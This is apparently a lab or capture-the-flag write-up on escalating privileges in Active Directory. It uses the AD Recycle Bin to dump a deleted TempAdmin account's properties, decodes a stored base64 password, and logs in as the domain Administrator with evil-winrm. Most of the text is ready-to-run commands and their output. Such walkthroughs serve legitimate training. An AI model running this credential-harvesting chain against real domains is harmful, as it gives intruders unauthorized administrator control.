
A user part of the AD Recycle Bin Group can restore accounts from it.
The Active Directory Recycle Bin is used to recover deleted Active Directory Objects such as Users, Groups, OU's etc. The objects keep all their properties intact while in the AD Recycle Bin, which allows them to be restored.

1. Enumerating all Objects Inside:

```
Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
```

This revealed the previously discovered TempAdmin Account! Let's restore him!

2. Checked properties of all objects and found password!

```
Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
```

The password seems to be an base64 encoded string. Let's decode it.

```
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
baCT3r1aN00dles
```

Since we previously also enumerated that the TempAdmin Shares the same password as the Administrator user, let's verify if we can authenticate against the DC via evil-winrm, we can!

```
nxc winrm cascade.local -u Administrator -p 'baCT3r1aN00dles'
```

Connected to CASC-DC1 as Administrator.

```
evil-winrm -i cascade.local -u Administrator -p 'baCT3r1aN00dles'
```